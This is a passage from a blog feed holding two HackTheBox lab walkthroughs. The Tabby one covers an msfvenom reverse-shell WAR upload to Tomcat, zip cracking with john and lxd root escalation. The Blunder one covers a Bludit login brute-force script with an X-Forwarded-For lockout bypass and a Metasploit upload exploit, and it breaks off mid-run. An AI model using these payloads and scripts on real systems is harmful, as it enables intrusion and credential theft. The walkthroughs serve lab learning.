   &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"tomcat"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3cureP4s5w0rd123</span><span class="s2">!"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"admin-gui,manager-script"</span>/&gt;
</code></pre></div></div>
<h2 id="getting-foothold">Getting Foothold</h2>

<h2 id="time-for-creating-the-backdoor">Time for creating the backdoor.</h2>

<h3 id="there-are-two-ways-of-doing-this-this-is-my-of-doing-it">There are two ways of doing this. This is my of doing it.</h3>

<p>Uploading a payload as <code class="language-plaintext highlighter-rouge">.war</code> file can give us the reverse shell.</p>

<h2 id="crafting-the-payload-with-msfvenom">Crafting the payload with msfvenom.</h2>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war</code></p>
</blockquote>

<p>Try to use <code class="language-plaintext highlighter-rouge">LPORT</code> as some thing other than <code class="language-plaintext highlighter-rouge">1234</code> because there are lot of users hacking the same machine!..</p>

<h2 id="time-to-upload-the-payload-now">Time to upload the payload now.</h2>

<p><code class="language-plaintext highlighter-rouge">curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.194:8080/manager/text/deploy?path=/payload.war"</code></p>

<p>When you see <code class="language-plaintext highlighter-rouge">ok</code> that means the <code class="language-plaintext highlighter-rouge">payload</code> has been uploaded successfully.</p>

<p><img src="/assets/img/sample/tabby/tabby4.png" alt="" /></p>

<p>Now set up listener <code class="language-plaintext highlighter-rouge">nc -lvnp 5566</code> and go to <code class="language-plaintext highlighter-rouge">tabby.htb:8080/payload.war</code> and you should get a <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>

<p>use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")'</code> for the shell upgrade.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span>
<span class="n">ls</span>
<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span>  <span class="n">archive</span>  <span class="n">revoked_certs</span>  <span class="n">statement</span>
<span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation-to-user-ash">Privilege escalation to User <code class="language-plaintext highlighter-rouge">ASH</code></h2>

<p>Ennumeration on <code class="language-plaintext highlighter-rouge">/var/www/html</code> there is a folder called <code class="language-plaintext highlighter-rouge">files</code> which contains a <code class="language-plaintext highlighter-rouge">backup.zip</code> file <code class="language-plaintext highlighter-rouge">16162020_backup.zip</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="nd">@tabby</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">36</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">21</span><span class="p">:</span><span class="mi">59</span> <span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">16</span><span class="p">:</span><span class="mi">24</span> <span class="p">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">8716</span> <span class="n">Jun</span> <span class="mi">16</span> <span class="mi">13</span><span class="p">:</span><span class="mi">42</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nb">zip</span>
</code></pre></div></div>

<p>So I tried extracting it, but it is <code class="language-plaintext highlighter-rouge">password</code> protected.</p>

<h2 id="cracking-the-password-with-john">Cracking the password with <code class="language-plaintext highlighter-rouge">JOHN</code>.</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">zip2john</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span> <span class="o">&gt;&gt;</span> <span class="n">backup</span><span class="o">-</span><span class="nb">hash</span>
<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">encrypted!</span>
<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="ow">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">favicon</span><span class="p">.</span><span class="nf">ico</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">338</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">766</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">282</span><span class="no">B6DE2</span>
<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="o">/</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="ow">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">3255</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">14793</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">285</span><span class="no">CC4D6</span>
<span class="n">ver</span> <span class="mf">1.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">logo</span><span class="p">.</span><span class="nf">png</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">2906</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">2894</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">2</span><span class="no">F9F45F</span>
<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">news</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">114</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">123</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">5</span><span class="no">C67F19E</span>
<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">Readme</span><span class="p">.</span><span class="nf">txt</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">805</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">1574</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">32</span><span class="no">DB9CE3</span>
<span class="no">NOTE</span><span class="p">:</span> <span class="no">It</span> <span class="n">is</span> <span class="n">assumed</span> <span class="n">that</span> <span class="n">all</span> <span class="n">files</span> <span class="k">in</span> <span class="n">each</span> <span class="n">archive</span> <span class="n">have</span> <span class="n">the</span> <span class="n">same</span> <span class="n">password</span><span class="o">.</span>
<span class="no">If</span> <span class="n">that</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">the</span> <span class="k">case</span><span class="p">,</span> <span class="n">the</span> <span class="nb">hash</span> <span class="n">may</span> <span class="n">be</span> <span class="n">uncrackable</span><span class="o">.</span> <span class="no">To</span> <span class="n">avoid</span> <span class="n">this</span><span class="p">,</span> <span class="n">use</span>
<span class="n">option</span> <span class="o">-</span><span class="n">o</span> <span class="n">to</span> <span class="n">pick</span> <span class="n">a</span> <span class="n">file</span> <span class="n">at</span> <span class="n">a</span> <span class="n">time</span><span class="o">.</span>
</code></pre></div></div>

<p>Trying to crack the hash with the help of <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>

<h3 id="john-backup-hash--wusrsharewordlistsrockyoutxt"><code class="language-plaintext highlighter-rouge">john backup-hash -w=/usr/share/wordlists/rockyou.txt</code></h3>

<p>and the password is <code class="language-plaintext highlighter-rouge">admin@it </code>.</p>

<h2 id="unzipping-the-file-with-the-password-found">Unzipping the file with the password found.</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
<span class="o">[</span>16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
</code></pre></div></div>
<h4 id="bad-luck-that-was-a-rabbit-hole">Bad luck! That was a <code class="language-plaintext highlighter-rouge">Rabbit hole</code>..</h4>

<p>So I used the <code class="language-plaintext highlighter-rouge">password</code> <code class="language-plaintext highlighter-rouge">admin@it</code> with the user <code class="language-plaintext highlighter-rouge">ash</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">su</span> <span class="o">-</span> <span class="n">ash</span>
<span class="n">Password</span><span class="p">:</span> <span class="n">admin</span><span class="nd">@it</span>
<span class="n">ash</span><span class="nd">@tabby</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
<span class="n">whoami</span>
<span class="n">ash</span>
</code></pre></div></div>
<h2 id="getting-usertxt">Getting User.txt</h2>

<p>ash@tabby:~$ cat user.txt
cat user.txt
d<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>1</p>

<h2 id="privilege-escalation-to-root">Privilege Escalation to Root.</h2>

<blockquote>
  <p>Checking the id of <code class="language-plaintext highlighter-rouge">ash</code></p>
</blockquote>

<p><code class="language-plaintext highlighter-rouge">ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</code></p>

<h4 id="we-see-that-ash-is-part-of-lxd-group-so-according-to-article-httpswwwhackingarticlesinlxd-privilege-escalation-i-just-followed-the-steps-and-got-root-">We see that ash is part of lxd group. So according to article <code class="language-plaintext highlighter-rouge">https://www.hackingarticles.in/lxd-privilege-escalation/</code> I just followed the steps and got root .</h4>

<h4 id="as-there-are-many-ways-on-priv-esc-using-lxd-i-took-help-of-hackingarticles-for-it">As there are many ways on priv esc using <code class="language-plaintext highlighter-rouge">LXD</code> I took help of <code class="language-plaintext highlighter-rouge">hackingarticles</code> for it.</h4>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">git</span> <span class="nb">clone</span>  <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">saghul</span><span class="o">/</span><span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span><span class="p">.</span><span class="nf">git</span>
<span class="n">cd</span> <span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span>
<span class="p">.</span><span class="nf">/</span><span class="n">build</span><span class="o">-</span><span class="n">alpine</span>

</code></pre></div></div>

<h4 id="you-will-get-a-targz-file-set-up-http-server-and-copy-it-to-the-remote-machine">You will get a <code class="language-plaintext highlighter-rouge">tar.gz</code> file. Set up http server and copy it to the remote machine.</h4>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 8080</code></p>
</blockquote>

<h4 id="on-another-hand-we-will-download-the-alpine-image-inside-tmp-directory-on-the-host-machine">On another hand we will download the alpine-image inside <code class="language-plaintext highlighter-rouge">/tmp</code> directory on the host machine.</h4>

<blockquote>
  <p>cd /tmp
wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz</p>
</blockquote>

<h4 id="after-the-image-is-built-it-can-be-added-as-an-image-to-lxd-as-follows">After the image is built it can be added as an image to LXD as follows:</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz <span class="nt">--alias</span> myimage
lxc image list
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>lxc start ignite
lxc <span class="nb">exec </span>ignite /bin/sh
<span class="nb">id</span>
</code></pre></div></div>

<p>``` shell	
cd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # cat root.txt
cat root.txt
3<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>5</p>

<hr />

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="linux" /><category term="gobuster" /><category term="lfi" /><category term="john" /><category term="tomcat" /><category term="lxd" /><summary type="html"><![CDATA[Tabby is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!]]></summary></entry><entry><title type="html">HackTheBox Blunder</title><link href="http://localhost:4000/hackthebox/retired/2020/06/30/Blunder.html" rel="alternate" type="text/html" title="HackTheBox Blunder" /><published>2020-06-30T22:09:00+05:30</published><updated>2020-06-30T22:09:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/06/30/Blunder</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/06/30/Blunder.html"><![CDATA[<h2 id="lets-get-started">Let’s get started</h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -sC -Pn -p- -T4 blunder.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 03:56 EDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.19s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.80 seconds
</code></pre></div></div>

<p>Seeing that Port 80 is open, So I need to ennumerate on only one port..</p>

<blockquote>
  <p>Using some manual enumeration I found the page <code>blunder.htb/admin</code> which took me to the <code>admin</code> page.</p>
</blockquote>

<p><img src="/assets/img/sample/blunder/blunder2.png" alt="" /></p>

<blockquote>
  <p>Seeing the name <code>BLUDIT</code> I searched for an exploit online. <code> https://www.exploit-db.com/exploits/47699 </code> and that has a <code>Metasploit</code> module to it.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE

msf5 &gt; search bludit

Matching Modules
================

#  Name                                          Disclosure Date  Rank       Check  Description
-  ----                                          ---------------  ----       -----  -----------
0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
</code></pre></div></div>

<p>Using <code>Gobuster</code> to find some intersting stuff on the page.</p>

<h2 id="gobuster">Gobuster</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://blunder.htb -x txt -s 200 -w /usr/share/dirb/comm.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://blunder.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/comm.txt
[+] Status codes:   200
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/07/05 04:03:42 Starting gobuster
===============================================================
/todo.txt (Status: 200)
===============================================================
2020/07/05 04:04:26 Finished
===============================================================
</code></pre></div></div>

<p>Visiting the page <code>blunder.htb/todo.txt</code></p>

<p><img src="/assets/img/sample/blunder/blunder1.png" alt="" /></p>

<p>Assuming the username to be <code>Fergus</code></p>

<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code>blunder.htb/admin</code> with the help of <code>bludit-mitigation-bypass</code>.
<br /></p>

<p><br /></p>

<blockquote>
  <p><code> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
</blockquote>

<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bludit Mitigation bypass POC
+++++++++++++++++++++++++++++++++
#!/usr/bin/env python3
import re
import requests

host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
</code></pre></div></div>

<p>So to do this I made a custom password list <code>bluditpass.txt</code> using <code>CEWl</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -d 4 -m 5 -w bluditpass.txt --with-numbers http://blunder.htb 
CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
</code></pre></div></div>

<h2 id="viewing-the-custom-passwordlist">viewing the custom passwordlist.</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat bluditpass.txt
Plugins
service
Stadia
devices
Begin
Google
games
Include
Cover
image
Title
Creation
November
Reading
minute
Breaked
content
books
Awards
Fantasy
National
button
players
allows
stream
Dynamic
blunder
interesting
facts
About
Stephen
American
fiction
novels
which
feature
series
published
received
World
awarded
Medal
created
literature
Award
range
centers
through
smartphones
tablets
state
users
library
their
other
title
Blunder
description
Favicon
Bootstrap
bootstrap
Styles
theme
Robots
plugin
Navbar
Static
pages
Social
Networks
Content
Posts
Edwin
September
author
horror
supernatural
suspense
fantasy
million
copies
adapted
films
miniseries
television
comic
including
seven
under
Richard
Bachman
written
approximately
short
stories
collections
Stoker
British
Society
Foundation
Distinguished
Contribution
Letters
probably
fictional
character
RolandDeschain
tower
awards
contribution
entire
oeuvre
Achievement
Grand
Master
Mystery
Writers
America
United
States
Endowment
contributions
described
Horror
cloud
gaming
operated
capable
streaming
video
resolution
frames
second
support
dynamic
company
numerous
across
globe
provided
using
sufficiently
speed
Internet
connection
accessible
Chrome
browser
desktop
computers
smart
televisions
digital
media
Chromecast
integrated
YouTube
share
viewers
launch
streamer
selling
point
compatible
class
controllers
though
proprietary
controller
manufactured
direct
available
alongside
similar
Netflix
requires
purchase
rather
access
While
monthly
subscription
higher
rates
larger
resolutions
offer
Short
universal
serial
pronounced
interface
computer
communicate
peripheral
connected
cover
broad
anything
keyboards
music
flash
drives
information
these
section
power
certain
charge
batteries
first
commercial
release
Universal
Serial
version
January
industry
standard
quickly
adopted
Intel
Compaq
Microsoft
companies
Pagination
Right
Sidebar
files
nothing
Footer
Copyright
2019Powered
byEgotisticalSW
Javascript
HackTheBox
</code></pre></div></div>

<h3 id="as-the-password-list-is-ready-its-time-for-weaponzation">As the Password list is ready, it’s time for weaponzation!</h3>

<h2 id="final-crafted-script">Final crafted script………….</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
import re
import requests
#from __future__ import print_function

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('bluditpass.txt')

'''# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')
'''
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
</code></pre></div></div>

<h2 id="time-to-fire-up-the-bruteforce-script">Time to fire up the bruteforce script..</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bluditbrute.py 
[*] Trying: Plugins
[*] Trying: service
[*] Trying: Stadia
[*] Trying: devices
[*] Trying: Begin
[*] Trying: Google
[*] Trying: games
[*] Trying: Include
[*] Trying: Cover
[*] Trying: image
[*] Trying: Title
[*] Trying: Creation
[*] Trying: November
[*] Trying: Reading
[*] Trying: minute
[*] Trying: Breaked
[*] Trying: content
[*] Trying: books
[*] Trying: Awards
[*] Trying: Fantasy
[*] Trying: National
[*] Trying: button
[*] Trying: players
[*] Trying: allows
[*] Trying: stream
[*] Trying: Dynamic
[*] Trying: blunder
[*] Trying: interesting
[*] Trying: facts
[*] Trying: About
[*] Trying: Stephen
[*] Trying: American
[*] Trying: fiction
[*] Trying: novels
[*] Trying: which
[*] Trying: feature
[*] Trying: series
[*] Trying: published
[*] Trying: received
[*] Trying: World
[*] Trying: awarded
[*] Trying: Medal
[*] Trying: created
[*] Trying: literature
[*] Trying: Award
[*] Trying: range
[*] Trying: centers
[*] Trying: through
[*] Trying: smartphones
[*] Trying: tablets
[*] Trying: state
[*] Trying: users
[*] Trying: library
[*] Trying: their
[*] Trying: other
[*] Trying: title
[*] Trying: Blunder
[*] Trying: description
[*] Trying: Favicon
[*] Trying: Bootstrap
[*] Trying: bootstrap
[*] Trying: Styles
[*] Trying: theme
[*] Trying: Robots
[*] Trying: plugin
[*] Trying: Navbar
[*] Trying: Static
[*] Trying: pages
[*] Trying: Social
[*] Trying: Networks
[*] Trying: Content
[*] Trying: Posts
[*] Trying: Edwin
[*] Trying: September
[*] Trying: author
[*] Trying: horror
[*] Trying: supernatural
[*] Trying: suspense
[*] Trying: fantasy
[*] Trying: million
[*] Trying: copies
[*] Trying: adapted
[*] Trying: films
[*] Trying: miniseries
[*] Trying: television
[*] Trying: comic
[*] Trying: including
[*] Trying: seven
[*] Trying: under
[*] Trying: Richard
[*] Trying: Bachman
[*] Trying: written
[*] Trying: approximately
[*] Trying: short
[*] Trying: stories
[*] Trying: collections
[*] Trying: Stoker
[*] Trying: British
[*] Trying: Society
[*] Trying: Foundation
[*] Trying: Distinguished
[*] Trying: Contribution
[*] Trying: Letters
[*] Trying: probably
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
</code></pre></div></div>

<blockquote>
  <p><code>SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
</blockquote>

<h4 id="checking-the-credentials-with-the-login-page-works">Checking the credentials with the login page works!</h4>

<p><img src="/assets/img/sample//blunder/blunder3.png" alt="" /></p>

<h4 id="as-all-the-required-credentials-are-found-its-time-to-step-up-the-game">As all the required credentials are found, its time to step up the game.</h4>

<p>Using <code>metasploit</code> to get the initial foothold.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE

msf5 &gt; search bludit

Matching Modules
================

#  Name                                          Disclosure Date  Rank       Check  Description
-  ----                                          ---------------  ----       -----  -----------
0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts blunder.htb
rhosts =&gt; blunder.htb
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost tun0
lhost =&gt; tun0
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus
bludituser =&gt; fergus
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain
bluditpass =&gt; RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
</code></pre></div></div>

<p>If the config is set correctly then there should be no problem of getting the <code>meterpreter</code> session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.51:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading KtkujjMWRu.png...
[*] Uploading .htaccess...
[*] Executing KtkujjMWRu.png...
